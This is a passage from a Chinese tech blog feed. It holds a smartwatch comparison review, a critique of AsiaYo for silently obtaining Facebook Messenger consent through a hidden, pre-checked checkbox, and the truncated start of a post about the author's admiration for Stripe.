title="運動健康類"></a>運動健康類</h3><p>這類的代表就是 Fitbit，應該提供的功能有：</p><ol><li>計步器</li><li>心跳偵測</li><li>運動模式（例如說紀錄跑步軌跡之類的）</li><li>燃燒卡洛里計算</li></ol><p>其實就是一般那種健康類 App 會提供的功能都必須要有就是了，而目前看起來，許多穿戴式裝置都朝著這個方向走。</p><p>以我自己來說，其實我看重的是功能面。這也是為什麼我會喜愛 ZenWatch 的緣故。我用智慧型手錶最重要的目的其實就只是：</p><blockquote><p>我想要管理（查看、回覆）手機上的通知</p></blockquote><p>ZenWatch 在這方面簡直是一百分。</p><p>我舉兩個場景給大家當範例，第一個場景是有天你在搭公車，手機滑一滑發現沒什麼東西可以看，就把它放回口袋裡，決定到家前都不要再拿出來，不要一直當低頭族。</p><p>就在這時你的手機震動了一下，要嘛就是有訊息要嘛就是有新的郵件，你該怎麼辦？</p><p>如果沒有智慧型手錶，你就必須拿出手機，就只為了看那個可能一點都不重要的通知。可是如果你有智慧型手錶，你就可以簡單看看你的手錶，就能夠看到這個通知是什麼。</p><p>這對我來說是很實用的一個功能。</p><p>如果是重要的信件，我可以先在手錶上看個大概，你可能會問說螢幕這麼小怎麼看，但我必須說這螢幕其實沒有想像中的小，而且你的信件也不太可能這麼長，通常滑個三四次就可以把整封郵件看完。</p><p>如果是垃圾信，我可以直接在手錶上把信件刪除，十分方便。</p><p>這就是智慧型手錶對我最大的意義：在不拿出手機的前提下管理通知。</p><p>第二個場景是你跟朋友約好十點要吃早午餐，九點五十五分的時候你剛好下了公車，準備走路過去，此時你的手機震動了一下，是你的朋友傳訊息過來問你在哪。</p><p>如果你有手錶的話，你可以不用拿出手機，直接在手錶上按回覆，並且利用語音轉文字的功能直接用講的回覆，說：「我快到了」，就是這麼簡單。</p><p>除此之外，還有一個功能對我超級實用。</p><p>我是一個很討厭很討厭聽到手機鈴聲的人，所以我手機永遠都開震動。因此只要是口袋比較鬆或者是正在走路，有 87% 的機率我察覺不到手機在震動，所以都會漏接電話。</p><p>但有了智慧型手錶之後，手錶在震動你一定察覺得到，因此可以直接在手錶上決定你要不要接電話，不想接的話可以直接掛掉。</p><p>智慧型手錶對我來說，就是能夠省掉：「拿出手機」這個動作。而我自己還滿喜歡的，我覺得這對我來說是有價值的。</p><p>好，接著我們再講回我的第一隻手錶 ZenWatch。</p><p><img src="/img/smartwatch-review-55dac978bbf5/1__JyunwwgQ4__SD4JZgs92jDA.jpeg"></p><p>我還滿喜歡真皮的錶帶，但缺點就是夏日的時候怕流汗，必須常常把手錶拿下來。</p><p>在功能面的部分我很滿意，我剛才說到的那些使用場景，都是我日常生活中時常會發生的。而且之後還有推出可以在手錶上面畫 emoji 的功能，超級有趣。就你畫完之後它會辨識你畫的是哪一個 emoji，可以藉此跟朋友玩畫畫遊戲。</p><p>講完了優點，該來講缺點了。</p><p>第一個缺點是續航力，這隻手錶用到後面，必須每天充一次電。雖然充到後面也習慣了，但還是覺得有點麻煩。</p><p>第二個缺點是充電器用久了故障率很高。這隻手錶的充電是提供一個背蓋，你把背蓋接上去之後，手錶後面的充電區會跟背蓋上面的貼合在一起，就可以順利充電。</p><p>但問題是有時候你明明就合上去了，卻沒有開始充電。之後我看討論區發現很多人也有這個情形，就用久了所以感應不良，需要多試幾次才行。</p><p>第三個缺點是容易斷線，因為這隻手錶在斷線的時候會提示，手錶會震動一下，有時候明明就用得好好的，卻會莫名其妙斷線，手錶就會時不時震動，搞得我都不知道是真的震動還是我有幻震了。</p><p>必須特別強調的是第三個缺點，因為我發現所有的穿戴式裝置都有這個問題，不知道是我手機的問題，還是藍芽真的這麼容易斷線？</p><h3 id="改頭換面：Pebble-Time"><a href="#改頭換面：Pebble-Time" class="headerlink" title="改頭換面：Pebble Time"></a>改頭換面：Pebble Time</h3><p>因為上述種種問題，我開始尋覓新的智慧型手錶，後來剛好看到 Pebble Time（Pebble 的第二代手錶）在 kickstarter 上面募資，就決定買來試試看，價錢是 200 鎂，折合台幣約 6500 左右。</p><p>那時候吸引我的點有三個：電子紙材質、超強續航力跟可以用 JavaScript 寫 App 在上面跑。</p><p><img src="/img/smartwatch-review-55dac978bbf5/1__Yykt8VazrTKFFJFTegNl8w.jpeg"></p><p>Pebble Time 的電子紙材質之所以吸引我，是因為 ZenWatch 的那種螢幕缺點顯而易見，就是在強光下什麼都看不到。而電子紙很特別，光源越強就越亮，在夏天早上的時候真的超級亮。</p><p>而且也因為這個材質，所以手錶變得很省電，我記得官方說法是大概可以撐一個禮拜，而我自己測試的結果發現撐個 4, 5 天是完全沒問題的。</p><p>但這隻 Pebble Time，我用了兩三個禮拜之後，就趕在試用期結束前把它退回去美國了。</p><p>為什麼？因為我用得很不習慣，我覺得 ZenWatch 完全碾壓這隻手錶。</p><p>還記得我說我用智慧型手錶最注重的是什麼嗎？是功能面。而 Pebble Time 因為不支持 Android Wear 的關係，所以在功能面簡直輸慘了。例如說我在手機上如果有裝黑名單 App 把某些簡訊擋掉，那我的 ZenWatch 就不會收到通知，可是 Pebble Time 卻會，這個還滿惱人的。</p><p>而通知的顯示上面，我也是比較喜歡 ZenWatch，ZenWatch 的通知就是每一個都是一張 card，你可以往右滑消掉，或是往左滑看更多資訊，而同樣類型的通知會集合在一起。</p><p>例如說我有 2 封 email，那就會顯示第一封的標題跟一些文字，按下+號之後看之後幾封，所以通知多的時候非常方便，你就一直滑滑滑就好，跟手機差不多。</p><p>Pebble Time 的話是用按鍵操控，這邊就跟 ZenWatch 有超級大的差異。第一點差異是 Facebook 訊息的通知 ZenWatch 會集中到一個 Card 裡面，你點進去就可以看之前的訊息。</p><p>而 Pebble Time 是每一則都是一個通知，還有如果你把一個通知消掉想看另外一個，你必須到「通知頁面」去看，但是 ZenWatch 把錶面跟通知頁面做在同一個地方（其實也沒有所謂的通知頁面），你就直接滑就好了，這點我覺得 ZenWatch 在方便性上面大勝。</p><p>而且用慣了觸控式螢幕，真的很難回去用按鍵的了。比較長的信件我以前只要滑滑滑就好，用 Pebble Time 的話要一直按著按鍵才能看完，很不方便。</p><p>至於自己寫 App 這點，當初也就是隨意嘗試了一下，覺得滿好玩的，但其實也不知道要寫些什麼東西，只是覺得很酷炫而已，所以加分歸加分，可是只把它當作一個附加功能。</p><p>總之呢，因為我的重點是通知，而 Pebble Time 在通知的管理以及顯示上面表現得不夠好，因此就被我淘汰了。</p><h3 id="再見曙光：TicWatch2"><a href="#再見曙光：TicWatch2" class="headerlink" title="再見曙光：TicWatch2"></a>再見曙光：TicWatch2</h3><p>自從把 Pebble Time 退貨以後，頓時之間對智慧型手錶失去信心，覺得智慧型手錶好像還沒那麼成熟，沒辦法找到一隻真的很不錯的手錶。</p><p>而之後華碩出了 ZenWatch3，觀望了一陣子之後決定再看看有沒有其他的選擇，就在這時候在臉書上看到了 TicWatch2 台灣版正在募資的消息，立刻預購了一隻手錶，價錢也大概是 6000 台幣左右。</p><p><img src="/img/smartwatch-review-55dac978bbf5/1__HkHMXIuyOnZU__g4vbDbHPA.jpeg"></p><p>如果說初代 ZenWatch 在功能面跟運動面的表現是 80:20 的話，TicWatch 就是 50:50，比重是一半一半，看得出來它想成為一隻全面性的手錶，兩邊都想討好。</p><p>可是這樣的比重，反而造成功能面表現平平，運動面表現也平平，對於我這種偏重其中一邊的人，就沒辦法取得優勢。</p><p>首先要稱讚的是 TicWatch 的充電，它有附一個圓形的充電底座，你只要把手錶放上去就可以充電了，而且充得很快。這個絕對是大加分的，方便程度僅次於無線充電了。</p><p>而功能也是十分多樣，只是我覺得跟 Android 的整合程度沒那麼好。之前官方主打的像是 Siri 那樣的語音助理，也沒那麼有用。例如說餐廳他們是接大眾點評的資料，在中國以外的地方幾乎起不了作用。</p><p>在通知的管理上也有些奇怪，很常會因為斷線而接收不到通知，或是手錶其實有連著，但還是收不到通知。但整體來說其實是還 ok 的。</p><p>而運動健康類這部分我平常都沒什麼在用，也就沒什麼好講的了。</p><p>噢對了，還有一個小缺點是觸控好像很敏感。有一次我看電影的時候把手錶放在口袋裡面，看完電影出來發現手錶自動幫我回覆很多訊息，同事還很納悶說我假日怎麼還發訊息，是不是在加班…</p><p>而且有時候觸控螢幕會怪怪的，怎麼按都沒反應，這時候只好重開機或是放到充電座上面就會正常了。</p><p>就在發現 TicWatch 在通知的管理上也還不夠好的時候，我又懷念起我的第一隻手錶 ZenWatch…</p><p>而此時，我看到了 Fitbit 併購 Pebble 後推出的智慧型手錶 Ionic 的新聞，決定請我朋友幫我從美國帶回來。</p><h3 id="移情別戀：Fitbit-Ionic"><a href="#移情別戀：Fitbit-Ionic" class="headerlink" title="移情別戀：Fitbit Ionic"></a>移情別戀：Fitbit Ionic</h3><p>這隻手錶很新，2017 年十月初才正式發售的，售價也比較貴，300 美金，折合台幣約 10000 元。</p><p><img src="/img/smartwatch-review-55dac978bbf5/1__pRujXS8xlBe2JZFjPuMZBw.jpeg"></p><p>雖然說 Fitbit 的專長就是運動健康類，但我買這隻手錶的時候，我還是抱持著它能夠把通知管理也做得很好的期望。</p><p>但我失望了。</p><p>因為 Ionic 的通知管理一樣做的挺差的，是我用過的四隻智慧型手錶裡面最差的。可是買都買了，怎麼辦呢？因此，我決定開始把我的需求轉向，從以前注重功能面，轉成注重健康管理面。</p><p>自從轉向之後，對 Ionic 的滿意度大幅提升，Fitbit 果然是這方面的專家。</p><p>Fitbit 在手錶後面會一直打一道光束來偵測你的心跳，是一個聽起來很厲害的技術，因此我就姑且相信 Fitbit 偵測出來的數據是準的。而有了這個偵測之後就可以做很多事，例如說睡眠偵測。</p><p>Fitbit 可以偵測你整個睡眠期間有多少時間是熟睡的，多少是快速眼動睡眠期，可以產出一個精美圖表，告訴你說你跟其他人相較之下是睡多還是睡少。</p><p><img src="/img/smartwatch-review-55dac978bbf5/1__kf1e0zQ7QYGo__Rux8nkd4g.jpeg"></p><p>除了睡眠以外，我最喜歡的功能就是運動模式。</p><p>你可以在跑步的時候開啟運動模式，因為 Ionic 有內建 GPS 的緣故，從此以後不必再帶著手機出門！只要戴著手錶你就可以記錄自己的跑步軌跡了。</p><p>跑完之後會有一個完整的報告，就跟你用其他跑步 App 會有的差不多，紀錄你哪些段的速度是多少，平均速度是多少，以及心跳跟總共消耗的卡路里，我還滿喜歡看這些報告的。</p><p>除了跑步以外，游泳也可以！它會紀錄你游了幾趟，而且還滿準確的。不過我想應該是因為在水下的關係，因此就沒有心跳偵測的功能了。</p><p><img src="/img/smartwatch-review-55dac978bbf5/1__OQFniUBfMkFs1DA5iNs1Zg.jpeg"></p><p>身為一個喜歡看各式各樣統計數據的人，自從戴了 Ionic 之後，就對它的健康管理功能愛不釋手，因為有一大堆數字可以看。</p><p>總而言之呢，Ionic 在運動健康方面的表現無可挑惕，可以彌補在通知面的不足。</p><p>不過，Ionic 依然有些缺點，例如說跟其他智慧型手錶一樣，會常斷線。不過身為一隻注重健康管理的手錶，其實也沒必要時時刻刻都跟手機同步，偶爾同步一次即可，因此這個缺點就顯得沒那麼重要。</p><p>還有一點我很想嘗試的就是 Fitbit 有 NFC，所以支援綁定信用卡，但是不同國家有限定不同的信用卡，台灣的話目前都沒有支援，新加坡的話有支援的銀行但我沒有卡QQ</p><p>以後有機會的話，去辦個卡再來跟大家分享心得。</p><h3 id="哀傷的總結"><a href="#哀傷的總結" class="headerlink" title="哀傷的總結"></a>哀傷的總結</h3><p>用了四款智慧型手錶之後，我覺得智慧型手錶還不是很成熟，至少我想要的功能還沒有任何一款可以達成（如果你知道有哪一款，請務必推薦我），我心目中理想的手錶是：</p><ol><li>通知管理要跟 ZenWatch 做的一樣（就是可以很輕鬆在手機上面查看、刪除或是回覆）</li><li>不能常常斷線（斷線真的是最嚴重的問題，是藍芽的原罪嗎？）</li><li>續航力佳（至少三天吧）</li></ol><p>其實就這樣而已，說不定 ZenWatch3 其實就滿足了？等我之後 Fitbit Ionic 用得受不了我再來考慮換手錶好了。</p><p>不過，現在的手錶好像都往運動健康管理類走了，在通知類的需求應該就是做到堪用而已。如果是這樣的話，感覺適合我的手錶會越來越難找，畢竟我注重的就是功能面。</p><p>Fitbit Ionic 在運動健康類已經做得很好了，希望能有一隻手錶是把功能面也做到這麼好，這樣我就可以兩隻手錶輪流戴了！</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AsiaYo 如何在一天內用 Chatbot 摧毀使用者體驗</title>
      <link href="/2017/10/30/about-asiayo-chatbot-28704dc9b84a/"/>
      <url>/2017/10/30/about-asiayo-chatbot-28704dc9b84a/</url>
      
        <content type="html"><![CDATA[<p>昨天看到了 AsiaYo 的這篇文章（沒看過的可以先看，之後內容會有相關）：<a href="https://medium.com/asiayo-engineering/asiayo-%E5%A6%82%E4%BD%95%E5%9C%A8%E4%B8%80%E9%80%B1%E5%85%A7%E6%89%93%E9%80%A0%E7%A0%B4%E8%90%AC%E4%BD%BF%E7%94%A8%E8%80%85%E7%9A%84-chatbot-66bebe330896">AsiaYo 如何在一週內打造破萬使用者的 Chatbot</a></p><p>身為裡面提到的「少數消費者」，我決定寫一篇文章記錄下來少數消費者針對他們 Chatbot 的心得，就讓我把這整段故事娓娓道來。</p><h3 id="故事的開端"><a href="#故事的開端" class="headerlink" title="故事的開端"></a>故事的開端</h3><p>AsiaYo 是一個民宿訂房網站，有天我在這網站搜尋著京都的住宿，搜著搜著右下角突然就跳出了一個仿造 Facebook Messenger 的小視窗：</p><p><img src="/img/about-asiayo-chatbot-28704dc9b84a/1__jFBjWITAkaMl8pFFHlGG6A.jpeg"></p><p>做的其實還可以，雖然看得出來是仿的就是了，但這不是重點，重點是他跟我說：「我發了一則訊息給你，晚點去 Facebook 收件匣瞧瞧吧～」，接著我打開了 Facebook，看到這個對話框：</p><p><img src="/img/about-asiayo-chatbot-28704dc9b84a/1__Kmb9FHQa7ZQ1jlZqkBRtJg.jpeg"></p><p>好了，現在問題來了：<br>如果你在這種情況下，你的反應會是什麼？</p><ol><li>哇，好酷！他居然可以傳訊息給我</li><li>他怎麼可以沒經過我同意傳訊息給我？</li><li>我是不是在哪邊按過同意但我忘記了</li><li>以上皆是</li></ol><p>我的答案是 4：以上皆是。</p><p>一開始想說是不是以前按過同意然後忘記了，不然怎麼可能可以主動傳訊息給我，他是怎麼知道我 Facebook 帳號的？就算知道了，怎麼可能有權限傳訊息給我？不是都要按同意才能夠傳送嗎？</p><p>接著仔細回想跟檢查過後發現自己確實沒同意過。</p><p>這時候身為工程師，就很好奇在技術上是怎麼做到的，難道 Facebook 有某種神秘的 API 嗎？</p><p>於是我就在 Facebook 的 Chatbot Developers Taiwan 發了<a href="https://www.facebook.com/groups/chatbot.tw/permalink/856285891216454/">這一篇文章</a>真心求解：</p><p><img src="/img/about-asiayo-chatbot-28704dc9b84a/1__6wZa2AlfCS10wzRqN7M5Qg.png"></p><h3 id="抽絲剝繭找真相"><a href="#抽絲剝繭找真相" class="headerlink" title="抽絲剝繭找真相"></a>抽絲剝繭找真相</h3><p>在提出問題之後，我自己也有找了一些臉書的相關文件，但都沒查到什麼相關的，後來經過一些網友給我的線索跟我自己之後的調查，發現一切都跟 <a href="https://developers.facebook.com/docs/messenger-platform/discovery/checkbox-plugin">checkbox plugin</a> 這個 Facebook 所提供的東西有關。</p><p>這個是什麼呢？簡單來說就是 Facebook 提供的 plugin，會顯示一個 checkbox，是用來勾選要不要同意某個粉絲專頁傳訊息給你，引用 JavaScript 並且設定過後就會顯示出這樣的 UI：</p><p><img src="/img/about-asiayo-chatbot-28704dc9b84a/1__CvvYOcpWT77wcem0fhpw7A.png"></p><p>一切都顯得十分合理，臉書提供這樣的 plugin，然後使用者勾選同意之後，粉絲專頁就擁有傳訊息給你的權限了。</p><p>除此之外還有一點，那就是這個 checkbox 是可以預設打勾的，所以整個頁面看起來會像這樣：</p><p><img src="/img/about-asiayo-chatbot-28704dc9b84a/1__EmwxOv8rPaa164vzJkdNcw.png"></p><p>不過預設打勾其實有一點怪怪的，你仔細想想以前在註冊會員時，不是都會有一個使用者條款要你勾選嗎？我記得 Google Play 上面的 App，那個使用者條款是不能預設勾選的。使用者必須「主動」的去同意才行。</p><p>可以看 <a href="https://play.google.com/intl/zh-TW_ALL/about/privacy-security-deception/personal-sensitive/">Google Play 開發人員政策中心</a>裡面有寫到：</p><blockquote><p>同意對話方塊必須以清楚明確的方式呈現；</p></blockquote><blockquote><p>使用者接受應用程式請求時，應用程式必須要求使用者進行確認 (例如輕觸接受、勾選核取方塊、口頭指令等)；</p></blockquote><p>有這樣的規範，就是為了確保使用者是主動同意的，一切才算數。使用者沒同意之前，你什麼事都不能做，不然就是違規行為。</p><p>預設打勾雖然怪怪的，但其實還算合理。因為除了預設打勾以外，應該還要有一個按鈕是：「我同意」，讓使用者主動同意之後，才代表願意接收你的訊息。</p><p>接著 Facebook 文件寫說，當使用者按下同意按鈕之後，你就可以利用他們提供的 function 去傳資料到你的 Server，並且就能夠傳訊息給使用者了。</p><p><img src="/img/about-asiayo-chatbot-28704dc9b84a/1__luQymWBsABwRFZ8q8L__pMA.png"></p><p>到這邊雖然有點怪怪的，但一切都還在合理的範圍內，就是讓傳訊息按鈕預設打勾，接著按下同意按鈕時傳送相關資訊並且獲得權限。</p><p>可是如果你是工程師，就會看到上面那一段程式碼，就算你不是寫在按鈕的 click 事件裡面也可以自己去呼叫，因為這按鈕是你網站自己的嘛，Facebook plugin 只包括 checkbox 而已，其他流程都是你可以自己控制的。</p><p>意思就是說：</p><blockquote><p>只要 checkbox 是勾選的狀態，我就能讓使用者同意授權（或是說，「被」同意授權）</p></blockquote><p>還記得前面有提到，這個 checkbox 可以調成預設就是勾選的嗎？所以只要我一進這個頁面，並且網站去 call 上面那一個 function，網站就能夠取得授權，並且傳訊息給我。</p><p>接著只差最後一步了，就是網站把這個 checkbox 用 CSS 隱藏起來，就能在神不知鬼不覺的情況下，讓使用者同意授權。</p><p>我來做個簡單總結：</p><ol><li>Facebook 提供了讓使用者同意授權的 checkbox plugin</li><li>這個 checkbox plugin 預設狀態可以調成已勾選（就是同意授權）</li><li>若是 checkbox 處在勾選狀態，就可以呼叫 function 取得授權</li><li>我只要把 checkbox 預設勾選並且藏起來，在頁面載入時我就能取得你的授權（儘管你什麼都不知道）</li></ol><p>這就是秘訣的所在，這就是為什麼 AsiaYo 可以不經過你的授權（其實你有授權，只是你不知道）就傳訊息給你。</p><p>從他們的網頁原始碼來看，也的確是這樣做的沒錯，右側紅框圈起來的部分是 CSS 語法，加上去就可以把 checkbox 隱藏起來，只要把這個 CSS 取消，就能夠看見頁面上其實是有 checkbox 存在的。</p><p><img src="/img/about-asiayo-chatbot-28704dc9b84a/1__fqmbgsMzaMn0yFeIAWUE0g.jpeg"></p><p>到這邊，大家應該都知道 AsiaYo 是怎麼做到的了。</p><p>（補充一下，Facebook 在十月初已經取消了 checkbox 可以預設勾選的功能，詳情可參考英文的<a href="https://developers.facebook.com/docs/messenger-platform/discovery/checkbox-plugin?locale=en_US">官方文件</a>）</p><h3 id="這樣好嗎？"><a href="#這樣好嗎？" class="headerlink" title="這樣好嗎？"></a>這樣好嗎？</h3><p>Facebook 提供這樣的 plugin 的初衷我能理解，是為了能夠降低一點門檻，可是卻讓網站可以把 checkbox 藏起來並且偷偷取得授權。</p><p>因此，我好奇的跑去找了 Facebook 的規範，想看看這樣做有沒有違反規範，最後我找到了 <a href="https://developers.facebook.com/policy?hc_location=ufi&locale=zh_TW#messengerplatform">Facebook 開放平台政策</a>，第十六點那邊寫到：</p><blockquote><p>a.將所有用戶驗證方式放置於清楚易見的位置，以確保用戶同意開始啟用訊息串。</p></blockquote><blockquote><p>b.除非用戶同意您或是您提供服務的第三方以 Messenger 進行聯絡，否則請勿在 Messenger 中聯絡他們。</p></blockquote><p>好，很顯然的把按鈕藏起來並不符合上面兩個規範，嗶嗶，你違規了。</p><p>到這邊我再幫大家總結一下，AsiaYo 的 Chatbot，就是在違反 Facebook 政策並且在你不知情的情況下，就讓你授權他們的 Chatbot 傳訊息給你。</p><p>身為使用者，你覺得這樣好嗎？我覺得爛透了。</p><p>我覺得這樣子是非常、非常不尊重使用者的做法。照理來說，你要用 Facebook Messenger 傳訊息給我需要我的同意，可是我明明就沒有同意，你憑什麼傳訊息給我？你憑什麼幫我同意？你憑什麼在我不知情的狀況下幫我同意？</p><h3 id="AsiaYo-的正面回應"><a href="#AsiaYo-的正面回應" class="headerlink" title="AsiaYo 的正面回應"></a>AsiaYo 的正面回應</h3><p>我前面 po 在臉書社團的那篇文章，下面我也有自己回覆我調查的結果，以及表達我對這種做法的不滿，並且在第一時間向臉書提出檢舉。</p><p>過一陣子之後，有人發現這個功能被拿掉了。看來應該是 AsiaYo 的人發現這篇文章，注意到這件事了。</p><p>接著隔天中午，AsiaYo 的 Product Lead 親自在貼文裡面<a href="https://www.facebook.com/groups/chatbot.tw/permalink/856285891216454/?comment_id=856534514524925&reply_comment_id=856545141190529&comment_tracking=%7B%22tn%22:%22R9%22%7D">回應</a>：</p><p><img src="/img/about-asiayo-chatbot-28704dc9b84a/1__E__jj__Wr__YmLu9nguDlVhDg.png"></p><p>雖然我還是覺得有點生氣，因為他們當初決定採用這個做法的時候，一定知道這種做法能夠成立的前提是：「在使用者不知情的情況下，偷偷幫使用者同意授權」。</p><p>但我想說大家都會犯錯，只要之後願意改進，我也願意再給 AsiaYo 一個機會，願意相信他們是一間在意使用者的公司，願意相信他們是一間不會隨意幫使用者偷偷授權的公司。</p><p>這件事情到這邊，就差不多結束了。</p><p>嗯，差不多。意思就是還沒結束。</p><h3 id="是訂閱，還是「被訂閱」？"><a href="#是訂閱，還是「被訂閱」？" class="headerlink" title="是訂閱，還是「被訂閱」？"></a>是訂閱，還是「被訂閱」？</h3><p>在這事情過後，由於 AsiaYo 之前出來回應的貼文裡面有提到他們 bot 的使用狀態不錯，因此就有其他朋友希望他們能夠出來分享經驗。後來他們有被邀請到其中一場活動去分享，這邊有<a href="https://m.facebook.com/groups/813879575430133?view=permalink&id=920313681453388">影片</a>，從 42 分鐘左右開始是他們的片段。</p><p>我覺得實體分享講的還不錯，有特地把「同意授權」這件事情放進去，也有講到說一開始的做法並不好，建議大家不要這樣做。</p><p>只是昨天，我看到 AsiaYo 發表了一篇相關的文章（就我開頭貼的那篇）：<a href="https://medium.com/asiayo-engineering/asiayo-%E5%A6%82%E4%BD%95%E5%9C%A8%E4%B8%80%E9%80%B1%E5%85%A7%E6%89%93%E9%80%A0%E7%A0%B4%E8%90%AC%E4%BD%BF%E7%94%A8%E8%80%85%E7%9A%84-chatbot-66bebe330896">AsiaYo 如何在一週內打造破萬使用者的 Chatbot</a></p><p>沒有那篇文章，就不會有我現在這篇，也不會有現在這個標題。</p><p>我覺得文章前面都講得不錯，提到很多現在做 Chatbot 碰到的困難點，以及他們希望 Chatbot 能夠變成什麼樣子、他們想要的 Chatbot 是什麼樣子。這些分享都很不錯。</p><p>不過接下來有關上面那次事件的描述，有些我實在是不能認同。我下面節錄原文，並且一併跟著做出回應。</p><blockquote><p>AsiaYo 旅行好朋友為了在旅客訂房時可以協助記錄，我們透過計時器判斷使用者瀏覽的時間，適時的在網頁上利用模擬的對話視窗提醒旅客是否還對觀看的主題感到興趣？進一步再傳送訊息給使用者，<strong>這中間使用者因為沒有任何需要登入及確認的動作，幾乎可以將整個流程步驟的點擊降到一次</strong>，減少觸發門檻。</p></blockquote><p>為什麼使用者不需要登入跟確認？因為你的網站偷偷幫他們確認了，在他們不知情的狀況下幫他們確認了。你真的覺得這樣好嗎？</p><blockquote><p>而我們上線這個功能不到一週，<strong>居然就獲得了超過數萬名用戶訂閱</strong>，我們也發現發現用戶數的波型可以和此來源的營收成正相關。</p></blockquote><p>我只想問一句：這些用戶是訂閱，還是<strong>被訂閱</strong>？</p><blockquote><p>即便上述的設計成效顯著，且使用者封鎖率不到萬分之一，但我們仍注意到了少數幾個使用者抱怨。</p></blockquote><blockquote><p><strong>儘管 AsiaYo 利用模擬對話提示使用者，少數消費者和 Chatbot 互動的過程中仍會察覺到自己被追蹤，並且對於追蹤的技術感到疑惑。</strong>因為追蹤手法過於隱密，容易造成使用者誤會，加上對話的形式也會接續所追蹤的內容，所以少數消費者收到通知時會一頭霧水，此時的使用者體驗反而會降低。</p></blockquote><p>少數消費者應該是包含我啦，畢竟我就是那個 po 文公開這整件事情的人。如果我沒有 po 文，不知道 AsiaYo 什麼時候會把這個功能拿掉，還是乾脆就一直用下去？</p><p>我今天在意的不是什麼對追蹤的技術感到疑惑。我是工程師，我知道我不管逛哪個網站都會被 Google 或是 Facebook 追到，我知道這些廣告會一直追著我跑，這我都知道。</p><p>我才不在乎你追不追蹤我，我才不在乎你是不是用了 base64，我在乎的是：</p><blockquote><p>為什麼你能夠理直氣壯的偷偷幫使用者同意？</p></blockquote><blockquote><p><strong>第二版中，我們針對第一版的反思，列出了同意條款。</strong></p></blockquote><p>這不是一開始就應該做的事情嗎？</p><p>今天我會再跳出來寫這篇文章，是因為我從文章裡面感覺不到 AsiaYo 認為自己做了一件錯誤的事情。</p><p>這篇文章讓我感覺好像是：「我做了一件很酷的 hack，在一週內讓使用者破萬，但因為有少數使用者抱怨，第二版就改掉了」</p><p>可是卻輕描淡寫的帶過，甚至沒有提到說這樣的手段是建立在「違反使用政策」以及「擅自幫使用者偷偷同意」的前提之下。使用者會抱怨不是因為被追蹤到，而是因為你做了一件完全不尊重使用者的事。</p><p>對我來說，之前這種行為就是完全不尊重使用者，完全是欺騙。今天臉書的政策寫得很明白，你如果想要主動傳訊息給使用者，你就要獲得他的同意，這個很合理吧？</p><p>但你們選擇走了一條投機取巧的路，利用規則不允許，但實作上可以的招數，「在使用者不知情的情況下幫他同意」，就算你後續轉換再好，我也不懂這樣子到底增進了什麼用戶體驗。</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>在 AsiaYo 的貼文裡面也有提到，第二版改進了流程，增加了同意條款（儘管我覺得這是一開始就應該，而且是必須要做的事情），改進過後的版本我就沒什麼意見了，完全符合規範。</p><p>我寫這篇文章的目的是我覺得 AsiaYo 的分享文有點搞錯重點，似乎沒有認清到「偷偷幫使用者同意」這件事情的嚴重性。</p><p>最後，就如同我標題所說的，他們成功在一天之內，利用 Chatbot 把使用者體驗摧毀了，讓我對這網站的好感度降到谷底。</p><p>如何在一週內讓 Chatbot 使用者破萬？我知道我知道，只要在使用者不知情的狀況下偷偷幫他同意授權，就能夠達成喔！</p>]]></content>
      
      
      <categories>
          
          <category> 科技 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 科技 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我與 Stripe ：一段愛與夢想的故事</title>
      <link href="/2017/10/22/stripe-and-i-df35a6f0a799/"/>
      <url>/2017/10/22/stripe-and-i-df35a6f0a799/</url>
      
        <content type="html"><![CDATA[<p>前陣子剛結束在新加坡的求職之旅，之前<a href="/2017/10/18/interview-prepare-b815d938f0de/">寫了一篇</a>整理這次的面試準備心得，除了那篇以外，還有一段是我很想特別記起來的。</p><p>沒錯，就是這篇要講的東西，記錄我跟 Stripe 之間的愛恨情仇（其實也沒有那麼可怕）。</p><p>Stripe 是我心目中的第一志願，是我「最想進去」的公司，沒有之一。所以副標題才會致敬三立華劇系列，取做一段愛與夢想的故事。</p><h3 id="Stripe-是什麼？"><a href="#Stripe-是什麼？" class="headerlink" title="Stripe 是什麼？"></a>Stripe 是什麼？</h3><p>如果你不知道 Stripe 也沒關係，因為一大堆人也不知道。先讓你看看 Stripe 的 Logo：</p><p><img src="/img/stripe-and-i-df35a6f0a799/1__m6pXBFDNitef__VSsgbWC2g.png"></p><p>好，還是沒印象嗎？那你可以參考底下這兩篇新聞：</p><ol><li><a href="https://www.bnext.com.tw/article/42046/stripe-raises-d-round-funding">線上金流明星 Stripe 再獲 1.5 億美元投資，市值達 90 億美元｜數位時代</a></li><li><a href="https://www.inside.com.tw/article/3668-stripe">Stripe：連 PayPal 創辦人都投資的金流公司 - INSIDE 硬塞的網路趨勢觀察</a></li></ol><p>簡單來說，Stripe 就是一間提供金流服務的公司，只要是跟金流有關的一切，都找他就對了。你也可以想成是 Paypal 或是台灣的歐付寶，但其實有些差異就是了。</p><h3 id="為何-Stripe-是我的夢想公司？"><a href="#為何-Stripe-是我的夢想公司？" class="headerlink" title="為何 Stripe  是我的夢想公司？"></a>為何 Stripe  是我的夢想公司？</h3><p>Stripe 在我心目中的地位崇高，總是會有個理由，一定是有些事情或者是某些 Stripe 的特點有打到我，才會讓我這麼喜愛這一間公司。</p><p>我第一次注意到 Stripe 這間公司，是因為看到他們的這篇部落格文章：<a href="https://stripe.com/blog/teaching-employees-to-code">How Stripe teaches employees to code</a></p><p>大意就是他們希望所有員工都有一點技術背景，這樣溝通起來比較方便，因此在內部開了一個程式的訓練課程，讓員工自由報名去上課。</p><p>這篇文章完全打到我，讓我對這間公司留下一個超級好的印象。</p><p>為什麼？因為我<a href="/2017/10/05/the-programming-journey-3-ebd9e995a4eb/">之前做過超級類似的事情</a>。我也在公司內部開課，開放對程式有興趣的人來報名，也一樣是教一些程式基礎。只是沒有像 Stripe 教這麼完整而且課程長度這麼長就是了。</p><p>簡單來說，就是我的理念跟 Stripe 的理念相符，而且做了同樣的事。這是一種找到知音的感覺：「哇，原來你們也這麼做！」</p><p>除了這個，我之後也無意間看到跟他們有關的一些新聞，例如說開放求職者可以帶自己的 team 一起來應徵，整組人一起加入公司：<a href="https://stripe.com/blog/bring-your-own-team">BYOT</a></p><p>或者是他們的創辦人上 Quora 回答一則有關於面試流程的問題，並且直接在網路上公開他們的 onsite interview 流程：<a 